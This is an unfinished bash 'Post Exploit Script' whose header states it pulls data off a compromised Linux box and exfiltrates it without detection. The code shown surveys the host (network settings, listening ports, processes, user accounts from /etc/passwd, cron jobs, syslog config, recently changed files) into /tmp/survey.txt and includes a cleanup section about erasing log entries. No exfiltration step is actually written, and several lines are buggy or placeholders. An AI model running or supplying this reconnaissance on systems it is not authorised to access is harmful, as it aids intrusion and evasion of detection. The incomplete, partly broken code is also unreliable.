#!/bin/bash
# 
################################################################################
#
#  NAME: Post Exploit Script
#
#  AUTHOR: Bobby Brooks
#
#  DATE: 20 October 2015
#
#  PROBLEM: I'm lazy and impatient and just want to run a script that will pull 
#        all relevant data off a box without any interaction on my part
#  
#  PURPOSE: To allow me to immediately run a post-exploit script that collects 
#        data and exfiltrates it without detection and with no user interaction.
#
#  STATUS: Development (20 October 2015)
#
#  NOTES: 
#        
#  USE: 
#
#  REFS: N/A (at the moment)
#
#  HISTORY:
#        20 October 2015 - 0.1
#
#  TESTING:
#        20 October 2015
#            Initially building out survey script
#
################################################################################

# Create survey.txt
touch /tmp/survey.txt

# Set variables:
start=$(date +"%y%m%d%H%M")



echo Start of Survey: >> /tmp/survey.txt
date >> /tmp/survey.txt

# Charactarization of host
echo Hostname: >> /tmp/survey.txt
hostname >> /tmp/survey.txt #  Hostname

echo >> /tmp/survey.txt
echo MAC Address: >> /tmp/survey.txt
ifconfig -a | grep HWaddr >> /tmp/survey.txt # MAC Address

echo >> /tmp/survey.txt
echo IP Address: >> /tmp/survey.txt
ifconfig -a | grep -B 1 inet | sed 's/inet/IP /g' && cat /etc/network/interfaces >> /tmp/survey.txt # IP Address/Subnet Mask (DHCP?):

echo >> /tmp/survey.txt
echo Gateway: >> /tmp/survey.txt
netstat -rn | grep -E ^0.0.0.0 | awk '{print$2}' >> /tmp/survey.txt #  Gateway:

echo >> /tmp/survey.txt
echo Gateway: >> /tmp/survey.txt
cat /etc/resolv.conf | grep -i nameserver >> /tmp/survey.txt #  DNS Servers


####### ????  #  Are any interfaces in promiscuous mode?   cat /sys/class/net/eth0/flags -0x1003 (no not in promiscuous mode)



echo >> /tmp/survey.txt
echo Operating System: >> /tmp/survey.txt
uname -o > /tmp/survey.txt # Operating System

echo >> /tmp/survey.txt
echo OS Version: >> /tmp/survey.txt
uname -v >> /tmp/survey.txt # OS Version

echo >> /tmp/survey.txt
echo System Manufacturer & Model: >> /tmp/survey.txt
cat /proc/cpuinfo | grep -i "model name" # Processor Type
cat /proc/meminfo | grep Mem # Physical Memory

echo >> /tmp/survey.txt
echo Memory Info:  Over 80% capacity? >> /tmp/survey.txt
echo ########## Need to finish math for NO/Yes >> /tmp/survey.txt
total=`cat /proc/meminfo | grep -i Memtotal | awk '{print $2}' `; free=`cat /proc/meminfo | grep -i MemFree | awk '{print $2}'`; echo $total $free; overload=`echo $total / $free | bc`; echo $overload # Is available memory over
80% capacity?


echo >> /tmp/survey.txt
echo Mount points: >> /tmp/survey.txt
df -k -l # List mount points
echo ########## Need to finish math for any drives over 80%? >> /tmp/survey.txt

echo >> /tmp/survey.txt
echo Remote Listening Ports: >> /tmp/survey.txt
netstat -pantu46 | grep -iE -e LISTEN  #  Remote Listening Ports (Include Attached Applications, use full path if available):


echo >> /tmp/survey.txt
echo DNS Suffix: >> /tmp/survey.txt
cat /etc/resolv.conf | grep -i search | cut -c 8- # DNS Suffix

echo >> /tmp/survey.txt
echo Geographic Location (Language): >> /tmp/survey.txt
locale | grep -i LANG  #  Locale:

echo >> /tmp/survey.txt
echo Time Zone: >> /tmp/survey.txt
date | awk '{print $5}' >> /tmp/survey.txt # Time Zone

echo >> /tmp/survey.txt
echo System Uptime: >> /tmp/survey.txt
uptime | awk '{print $3}'  #  System uptime:3:42

echo >> /tmp/survey.txt
echo Established Connections: >> /tmp/survey.txt
echo ########## Need to lookup info on the connections (OS, Geo Location, DNS, etc) >> /tmp/survey.txt
netstat -pantu46 | grep -iE -e ESTAB  #  Established Connections (Include what Applications and geographic location/dns lookup/OS of connected system):



echo >> /tmp/survey.txt
echo Purpose of host (Justify with proc/ports): >> /tmp/survey.txt
netstat -ano | grep -vi unix | grep LISTEN >> /tmp/survey.txt # Don't show port names, only numbers 
netstat -a | grep -vi unix | grep LISTEN >> /tmp/survey.txt # Show the port names to make it easier to digest
netstat -ano | grep -vi unix >> /tmp/survey.txt # Just show it all (minus the unix stuff)
echo ######## Need to identify what ports are in use

echo >> /tmp/survey.txt
echo netstat to ps matching (only if root): >> /tmp/survey.txt
for item in `netstat -pano | grep -vi unix | cut -c 81- | awk {'print $1'} | cut -d / -f 1`; do ps -fp $item | grep -v STIME; done >> /tmp/survey.txt # This outputs the process list of items in netstat (only works as root)

echo >> /tmp/survey.txt
echo Full Process List >> /tmp/survey.txt
ps -ef >> /tmp/survey.txt


echo  ################### >> /tmp/survey.txt
echo # 2.	Characterization of users (known user accounts, last noted activity for each user, every users technical sophistication, etc): >> /tmp/survey.txt
echo # For each user >> /tmp/survey.txt
echo # Name/SID: >> /tmp/survey.txt
echo # Type of Account: >> /tmp/survey.txt
echo # Description of Activity(ies) (are they logged on? How long. Processes running as that user, recent actions, etc): >> /tmp/survey.txt
echo # Technical Sophistication: >> /tmp/survey.txt
echo  ################### >> /tmp/survey.txt


echo >> /tmp/survey.txt
echo Who is logged in: >> /tmp/survey.txt
w >> /tmp/survey.txt

echo >> /tmp/survey.txt
echo User shells: >> /tmp/survey.txt
echo -- shell-login-- >> /tmp/survey.txt
cat /etc/passwd | grep -e "/sh" -e bash | cut -d : -f 1,7 >> /tmp/survey.txt # list users with shells
echo --nologin-- >> /tmp/survey.txt
cat /etc/passwd | grep -v -e "/sh" -e bash >> /tmp/survey.txt # list users without shells

echo >> /tmp/survey.txt
echo User IDs: >> /tmp/survey.txt
for item in `cat /etc/passwd | cut -d : -f 1`; do id $item; done # Print out id for all users

echo >> /tmp/survey.txt
echo User's processes: >> /tmp/survey.txt
ps -f | head -n 1 >> /tmp/survey.txt; for item in `cat /etc/passwd | cut -d : -f 1`; do echo "  === $item ==="; ps -fu $item | grep -v STIME; done >> /tmp/survey.txt # Print out processes by user

echo >> /tmp/survey.txt
echo User History: >> /tmp/survey.txt
echo ######### This requires identifying shells and searching through history

echo ##### Should DEFINITELY mention users without accounts (e.g. running as root/admin or a random ID number). >> /tmp/survey.txt
#
echo   #3.	Characterization of activity (established connections, shells and their child processes, etc): >> /tmp/survey.txt
echo  # For Each Established Connection/Shell >> /tmp/survey.txt
echo  # Inbound/Outbound IPs: >> /tmp/survey.txt
echo # Associated Processes: >> /tmp/survey.txt
echo  # Identifiable Recent Activity (Logs, history files, etc): >> /tmp/survey.txt


echo >> /tmp/survey.txt
echo Recently Visited/Pending Connections: >> /tmp/survey.txt
netstat -ano | grep -ive unix -ive establish -ive listen >> /tmp/survey.txt

echo ############ >> /tmp/survey.txt
echo #  Auditing/Logging (What is being audited/logged?): >> /tmp/survey.txt
echo #  Interesting Log Events not described elsewhere: >> /tmp/survey.txt
echo #  Last log written to: >> /tmp/survey.txt
echo #  Interesting Processes (or anomalies): >> /tmp/survey.txt



echo >> /tmp/survey.txt
echo PSPs: >> /tmp/survey.txt
echo ############## >> /tmp/survey.txt

echo >> /tmp/survey.txt
echo Cron jobs of interest: >> /tmp/survey.txt
ls -al /etc/cron* >> /tmp/survey.txt
cat /etc/crontab >> /tmp/survey.txt
echo ############## >> /tmp/survey.txt





echo >> /tmp/survey.txt
echo syslog.conf: >> /tmp/survey.txt
cat /etc/syslog.conf >> /tmp/survey.txt

echo >> /tmp/survey.txt
echo Find files modified since I've been on the box >> /tmp/survey.txt
touch -t $start /tmp/startfile
find /etc -newer startfile -ls
find /var -newer startfile -ls

echo ############ >> /tmp/survey.txt
echo # 4.	Identification of maliciousness (backdoors, rootkits, anomalous user >> /tmp/survey.txt
echo #  activity, etc): ############### strings against files >> /tmp/survey.txt
echo #  For each >> /tmp/survey.txt
echo #  Infected/Compromised Processes or Services: >> /tmp/survey.txt
echo #  Persistence Vectors: >> /tmp/survey.txt
echo #  Connections (Include IP/Geographic Location/hostname): >> /tmp/survey.txt
echo #  Inconsistencies:  >> /tmp/survey.txt


echo #########################  5.	Conclusion (provide an overall summary of the state of the box): >> /tmp/survey.txt
echo >> /tmp/survey.txt
echo Conclusion: >> /tmp/survey.txt
date >> /tmp/survey.txt

echo ######################### >> /tmp/survey.txt
echo Overall Summary of Current Machine State: >> /tmp/survey.txt
echo >> /tmp/survey.txt
echo Future state (scheduled jobs, etc): >> /tmp/survey.txt
echo >> /tmp/survey.txt
echo Recommendations (list follow-on actions for addition information gathering): >> /tmp/survey.txt
echo >> /tmp/survey.txt
echo Bring Back (Process/Document/Log/etc): >> /tmp/survey.txt
echo >> /tmp/survey.txt
echo Why is it interesting/What should we look for? >> /tmp/survey.txt
echo >> /tmp/survey.txt
echo Additional Information needed: >> /tmp/survey.txt
echo >> /tmp/survey.txt
echo Additional Tools required: >> /tmp/survey.txt
echo >> /tmp/survey.txt
echo Trustworthiness of box (can we continue to work with it?): >> /tmp/survey.txt
echo ######################### >> /tmp/survey.txt

####  Clean-up (Clean up your log entries if possible):

rm -rf /tmp/startfile
unset $start


echo >> /tmp/survey.txt
echo End of Survey: >> /tmp/survey.txt
date >> /tmp/survey.txt
